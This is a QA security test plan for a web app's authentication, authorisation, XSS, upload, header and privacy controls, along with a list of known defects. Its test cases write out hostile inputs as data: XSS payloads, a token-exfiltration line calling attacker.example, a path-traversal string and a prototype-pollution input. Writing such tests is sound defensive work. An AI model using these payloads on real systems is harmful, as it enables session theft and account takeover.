# 26 — Security

| | |
|---|---|
| **Area code** | `SEC` |
| **Scope** | Authentication, session handling, authorisation (user vs admin), cross-user data isolation, injection (XSS), upload safety, transport & headers, client-side secret exposure, third-party surface |
| **Authorisation model** | JWT in `localStorage`; `role` claim read client-side by `AdminRoute`; backend enforces `requireAdmin` on admin endpoints |
| **Tooling** | DevTools, curl/Postman with copied tokens, two browser profiles (user + admin), `npm audit`, security-header check |
| **See also** | doc 01 (auth flows), doc 02 (guards), doc 07 §8 (the app's worst XSS surface), doc 24 (contracts), doc 27 (headers) |

> Testing scope: this document covers **authorised** security testing of the team's own application in
> a non-production environment. Never run these cases against real user data.

---

## 1. Authentication & session

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-SEC-001 | P0 | Inspect where the JWT is stored | `localStorage.accessToken` (plus a copy in `localStorage["auth-storage"]`). Document the XSS-exposure trade-off vs an httpOnly cookie; combined with **DEF-82** (stored XSS in notes) this is directly exploitable ⚠ **DEF-276** |
| TC-SEC-002 | P0 | Log in and inspect the token payload | Contains `sub`, `exp`, `role` only — no password hash, email/PII beyond what is needed, and no secrets |
| TC-SEC-003 | P0 | Expired token, open a protected route | Redirect to `/auth/login`; no protected data fetched or rendered |
| TC-SEC-004 | P0 | Tampered token (change a payload byte) | `jwtDecode` may still parse it, but every API call returns `401` and the interceptor clears auth — no data is shown |
| TC-SEC-005 | P0 | Forged token with `role: "admin"` (self-signed) | `AdminRoute` renders (client cannot verify signatures) **but** every admin endpoint returns `401/403` and no data appears — verify per admin page |
| TC-SEC-006 | P0 | Log out, then press Back / re-enter a protected URL | Redirect to login; no cached protected view is restored from the bfcache with data visible |
| TC-SEC-007 | P0 | Log out and inspect storage | Expected: `accessToken`, `auth-storage`, `user-profile-store` cleared and the query cache reset. Currently only `accessToken` is removed, leaving a decodable token copy and a cached profile in `auth-storage`/`user-profile-store` ⚠ **DEF-18** |
| TC-SEC-008 | P0 | Shared-browser scenario: user A logs out, user B logs in | No trace of A's data anywhere (top nav, profile, lists, `localStorage`, query cache) — depends on DEF-18. Also check per-problem practice drafts (⚠ DEF-55) and interview history (⚠ DEF-142), which are keyed without a user id |
| TC-SEC-009 | P1 | Password handling | Passwords sent only over HTTPS in the request body; never in a URL, never logged (`logger` is dev-only), never stored in `localStorage` |
| TC-SEC-010 | P1 | Password-reset flow | The OTP is required with the email; verifying does not consume it; resetting does. A tampered `email` query param with someone else's OTP must fail ⚠ TC-AUTH-174 |
| TC-SEC-011 | P1 | OTP brute force | Submit 20 wrong OTPs — the backend must rate-limit/lock; the frontend has no throttling of its own (record the backend behaviour) ⚠ DEF-277 |
| TC-SEC-012 | P1 | Login brute force | 20 rapid failed logins — backend throttling expected; document the observed behaviour |
| TC-SEC-013 | P1 | Session fixation | The token issued at login is new each time; logging in twice invalidates nothing client-side but each token is independently valid until `exp` (no refresh/revocation exists) ⚠ DEF-278 |
| TC-SEC-014 | P2 | Token in URLs | No route or redirect ever carries the token as a query param (check `/auth/reset-password?email=&otp=` — the OTP **is** in the URL and lands in history/referrer logs) ⚠ **DEF-279** |
| TC-SEC-015 | P2 | Multi-tab logout | Logging out in one tab does not clear the other tab until navigation — document as accepted or add a storage listener ⚠ DEF-280 |

---

## 2. Authorisation & cross-user isolation

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-SEC-020 | P0 | Non-admin token: call every admin endpoint directly (12 write + 3 read paths) | `403` for all of them: `/admin/users`, `/admin/users/{id}/role`, `/admin/blogs/{id}`, `/admin/materials`, `/admin/materials/{id}`, `POST/PUT/DELETE /catalog`, `/catalog/{id}/generate-test-cases`, `/language` writes, `/system-design/**` writes, `/mock-interviews/**`, `/company-problems/**`, `/behavioral-questions/**` |
| TC-SEC-021 | P0 | Non-admin: open each of the 10 admin routes | Redirect to `/dsa` with **zero** admin requests issued |
| TC-SEC-022 | P0 | User A's token: read/update/delete user B's resources by id | `403/404` for: `GET/PUT /user/{B}`, `PUT/DELETE /dsa/{B's problem}`, `/dsa/todos/{id}`, `/notes/{id}`, `/blogs/{id}`, `/materials/{id}`, `/techinterview/{id}`, `/catalog/{id}/submissions` |
| TC-SEC-023 | P0 | User A: `GET /catalog/{id}/submissions` | Returns only A's submissions, never B's source code |
| TC-SEC-024 | P0 | User A: `GET /materials/user` | Only A's files; no `downloadUrl` for B's files |
| TC-SEC-025 | P1 | `GET /blogs` as any logged-in user | Returns **every** user's blogs (this powers both the "All" filter and admin moderation). Confirm whether unpublished drafts of other users are included — if so this is an information-disclosure defect ⚠ **DEF-87 / DEF-208** |
| TC-SEC-026 | P1 | Hidden test cases | `GET /catalog/{id}` exposes only `sampleTestCases`; run/submit responses must not reveal non-sample inputs the author marked hidden ⚠ TC-PRAC-140 |
| TC-SEC-027 | P1 | Internal code-execution service | Never called from the browser; no reachable URL in the bundle (grep the built JS for `0i56doitt8`) |
| TC-SEC-028 | P1 | Self-privilege protection | An admin cannot demote themselves through the UI; verify the API's behaviour if forced ⚠ TC-ADMU-056 |
| TC-SEC-029 | P1 | Privilege escalation via client state | Editing `localStorage["auth-storage"]` to `isAdmin: true` grants nothing (guards read the JWT) |
| TC-SEC-030 | P1 | Role propagation | A demoted admin's existing token keeps rendering admin UI until expiry, but every admin API call returns `403` and no data is shown ⚠ DEF-193 |
| TC-SEC-031 | P2 | Admin read endpoints | Decide and document whether `GET /system-design/**`, `/mock-interviews`, `/company-problems`, `/behavioral-questions` are intentionally public reads (they are meant to feed user pages) |

---

## 3. Injection: XSS (highest-risk area)

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-SEC-040 | P0 | **Note content** with `<img src=x onerror=alert(document.domain)>`, then open the note | No execution. The detail pane uses `dangerouslySetInnerHTML` after four regex replacements, so the payload is injected into the DOM ⚠ **DEF-82 — stored XSS, P0** |
| TC-SEC-041 | P0 | Note content with `<svg onload=alert(1)>`, `<iframe src=javascript:alert(1)>`, `<a href="javascript:alert(1)">`, `<details open ontoggle=alert(1)>`, `<style>` | None execute or affect layout |
| TC-SEC-042 | P0 | Exploit chain proof (in a test environment) | Note content `<img src=x onerror="fetch('https://attacker.example/?t='+localStorage.accessToken)">` viewed by another user must **not** exfiltrate a token. Combined with `localStorage` token storage (DEF-276) this is a full account-takeover path — treat as a release blocker |
| TC-SEC-043 | P0 | Same payload set in **blog** content and summary (markdown previewer) | Rendered inert (the previewer sanitises) — confirm explicitly for each payload |
| TC-SEC-044 | P0 | Same payload set in **DSA solutions/notes**, **technical-interview answer/notes**, **catalog description** (all markdown previewer) | Rendered inert for every payload |
| TC-SEC-045 | P1 | Payloads in short text fields rendered by React (titles, names, file names, tags, skills, emails, categories, company names) | Escaped everywhere: cards, tables, badges, dialog titles, confirmation messages, toasts |
| TC-SEC-046 | P1 | `javascript:` URLs in link fields (DSA problem link, todo link, company-problem link, social links, system-design resources) | Not rendered as an active href; clicking does nothing harmful ⚠ DEF-41/DEF-169 |
| TC-SEC-047 | P1 | `data:text/html,<script>…` in the same link fields | Same protection |
| TC-SEC-048 | P1 | Payload in a **search term** | Reflected safely (React-escaped); the URL is properly encoded (except tech-interview search ⚠ DEF-107) |
| TC-SEC-049 | P1 | Payload in an **uploaded file name** (`<img src=x onerror=1>.pdf`) | Escaped in the card, viewer title and confirmation dialog |
| TC-SEC-050 | P1 | Uploaded `.txt`/`.md` containing HTML/JS, opened in the text preview | Rendered inside `<pre>` as inert text, never as HTML |
| TC-SEC-051 | P1 | Uploaded CSV with `<script>` and `=HYPERLINK(...)` cells | Rendered as inert text; no formula execution (display-only table) |
| TC-SEC-052 | P1 | Uploaded SVG opened as an image record | `<img src>` cannot execute embedded scripts; verify nothing runs |
| TC-SEC-053 | P1 | Interview **frontend sandbox** with `<script>parent.postMessage(localStorage.accessToken,'*')</script>` | The iframe must be sandboxed so it cannot reach the parent origin/storage; verify `sandbox` attributes ⚠ **DEF-281** |
| TC-SEC-054 | P1 | Admin JSON fields (`data`, requirements, trade-offs, resources) containing HTML strings | Stored as data; rendered escaped wherever consumed |
| TC-SEC-055 | P2 | Markdown image/link to an external host | Loads or is blocked by CSP — document the policy (privacy/tracking consideration) |
| TC-SEC-056 | P2 | Regression suite | Add TC-SEC-040…044 to the automated regression set once DEF-82 is fixed |

---

## 4. Upload & file safety

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-SEC-060 | P1 | Upload a `.exe`/`.sh` renamed to `.pdf` | Backend/presign should reject by content type; the client only filters via `accept` ⚠ DEF-119. Record what the backend does |
| TC-SEC-061 | P1 | Upload an HTML file as `.txt` | Served/previewed as text, never executed |
| TC-SEC-062 | P1 | Presigned upload URL reuse | The URL is single-use/short-lived; replaying it after success fails |
| TC-SEC-063 | P1 | Presigned download URL sharing | A copied `downloadUrl` works until expiry even when logged out — confirm the TTL is short and document the exposure ⚠ **DEF-282** |
| TC-SEC-064 | P1 | Direct S3 bucket access without a signature | `403` (no public listing/read) |
| TC-SEC-065 | P1 | Oversized upload (100 MB) | Rejected by the backend/S3 policy with a visible error; no client crash |
| TC-SEC-066 | P2 | Content-Type spoofing in the presign request | The `PUT` must use the same content type; a mismatch fails the signature (TC-API-194) |
| TC-SEC-067 | P2 | File deletion removes the object | After delete, the previous `downloadUrl` no longer resolves |
| TC-SEC-068 | P2 | Path traversal in `fileName` (`../../etc/passwd`) | Stored as a plain name; no traversal in the S3 key; rendered escaped |

---

## 5. Transport, headers & platform

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-SEC-080 | P0 | All traffic over HTTPS | Every one of the nine API hosts, the S3 endpoints and the app itself; no mixed content |
| TC-SEC-081 | P1 | Response headers on the app (per `vercel.json`) | `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: SAMEORIGIN`, `Referrer-Policy: strict-origin-when-cross-origin` |
| TC-SEC-082 | P1 | Missing **Content-Security-Policy** | No CSP is configured. Given the `dangerouslySetInnerHTML` surface and a CDN image dependency, a CSP (with `script-src 'self'`) would be a strong mitigation ⚠ **DEF-283** |
| TC-SEC-083 | P1 | Missing `Permissions-Policy` | Consider denying camera/microphone/geolocation (the behavioral "record" button suggests future mic use) ⚠ DEF-284 |
| TC-SEC-084 | P1 | Clickjacking | `X-Frame-Options: SAMEORIGIN` present; attempt to frame the app from another origin → blocked |
| TC-SEC-085 | P1 | CORS on the nine API hosts | Only the app's origins are allowed; a request from a random origin is rejected |
| TC-SEC-086 | P1 | HTTP → HTTPS and apex/www redirects | `dev-diary-frontend-sigma.vercel.app` and `www.dev-diary.in` redirect (301) to `https://dev-diary.in` |
| TC-SEC-087 | P2 | Cookie flags | Only `sidebar_state` is set client-side (non-sensitive). Verify it is not marked with anything misleading and carries no user data |
| TC-SEC-088 | P2 | Cache-Control on API responses | Authenticated responses are not cached by intermediaries (`no-store`/`private`) — check a few endpoints |

---

## 6. Client-side exposure & dependencies

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-SEC-100 | P0 | Grep the built bundle for secrets | No API keys, no AWS credentials, no private tokens. Only public API Gateway URLs (expected) |
| TC-SEC-101 | P1 | `.env.prod` / `.env.development` handling | `.env.prod` is empty and `.gitignore` excludes secrets; confirm no secret ever lands in the repo or the bundle |
| TC-SEC-102 | P1 | Console/log leakage in production | `logger` is gated on `import.meta.env.DEV`; a production build prints nothing (tokens, payloads, emails) |
| TC-SEC-103 | P1 | Source maps in production | Verify whether `dist` ships `.map` files; if so, decide intentionally (they expose full source) ⚠ DEF-285 |
| TC-SEC-104 | P1 | `npm audit --production` | No high/critical advisories; record and triage moderates |
| TC-SEC-105 | P1 | Dependency review | No test-only tooling is listed under **`dependencies`**; test/dev tooling belongs in `devDependencies` only — previously an e2e testing framework and its plugin were misplaced here ⚠ **DEF-286 (fixed — e2e testing framework removed)** |
| TC-SEC-106 | P2 | Third-party runtime calls | Only own hosts + S3 + the `cdn-icons-png.flaticon.com` error icon (⚠ DEF-252). No analytics/tracker requests |
| TC-SEC-107 | P2 | `rel="noopener noreferrer"` on all external links | Verified on problem links, todo links, resources, "Open in a new tab" and blog links |
| TC-SEC-108 | P2 | `postMessage` listeners | None registered outside the interview sandbox; verify the sandbox does not accept arbitrary messages ⚠ DEF-281 |
| TC-SEC-109 | P2 | Prototype-pollution style inputs (`{"__proto__":{"x":1}}`) in admin JSON fields | Parsed as data; no global object pollution (check `Object.prototype.x` after saving) |

---

## 7. Business-logic & privacy

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-SEC-120 | P1 | Settings privacy controls | "Profile Visibility: Private" and "Show Progress" imply protections that do not exist and are not persisted ⚠ DEF-180 — misleading privacy claims are a compliance risk |
| TC-SEC-121 | P1 | 2FA toggle | Implies account security that is not implemented ⚠ DEF-188 |
| TC-SEC-122 | P1 | "Delete Account" | Confirms a deletion that never happens ⚠ DEF-190 — GDPR/erasure-request implications |
| TC-SEC-123 | P1 | "Export Data" | Promises an email export that is never sent ⚠ DEF-189 — data-portability implications |
| TC-SEC-124 | P1 | Data retained on the device | Practice drafts (source code), interview history (scores), persisted profile store — all survive logout; enumerate and document what a shared device exposes ⚠ DEF-18/DEF-55/DEF-142 |
| TC-SEC-125 | P2 | Admin visibility of user content | Admins can list every user's blogs and materials (including presigned download URLs ⚠ DEF-212); confirm this is documented policy |
| TC-SEC-126 | P2 | PII in the admin user list | Only email/name/role/created — no more than moderation needs |

---

## Known defects surfaced by this document

| ID | Case | Summary |
|----|------|---------|
| DEF-276 | TC-SEC-001 | JWT in `localStorage`, readable by any injected script |
| DEF-277 | TC-SEC-011 | No client-side throttling of OTP attempts (backend behaviour unverified) |
| DEF-278 | TC-SEC-013 | No token refresh/revocation mechanism |
| DEF-279 | TC-SEC-014 | Reset OTP travels in the URL query string |
| DEF-280 | TC-SEC-015 | Logout does not propagate across tabs |
| DEF-281 | TC-SEC-053/108 | Interview sandbox iframe isolation unverified |
| DEF-282 | TC-SEC-063 | Presigned download URLs work without a session until expiry |
| DEF-283 | TC-SEC-082 | No Content-Security-Policy |
| DEF-284 | TC-SEC-083 | No Permissions-Policy |
| DEF-285 | TC-SEC-103 | Production source-map exposure unverified |
| DEF-286 | TC-SEC-105 | E2e testing framework shipped as a production dependency (fixed — testing framework removed) |

## Exit criteria (all are release blockers)

1. **DEF-82 fixed** — TC-SEC-040…042 pass. Stored XSS plus `localStorage` tokens is account takeover.
2. **DEF-18 fixed** — TC-SEC-007/008 pass; logout leaves no recoverable session or user data.
3. All authorisation cases (TC-SEC-020…026) pass against the target environment.
4. Hidden-test-case and internal-service boundaries hold (TC-SEC-026/027).
5. No secrets in the bundle (TC-SEC-100); `npm audit` free of high/critical.
6. Misleading security/privacy controls (DEF-188, DEF-190, DEF-189, DEF-180) fixed or removed.
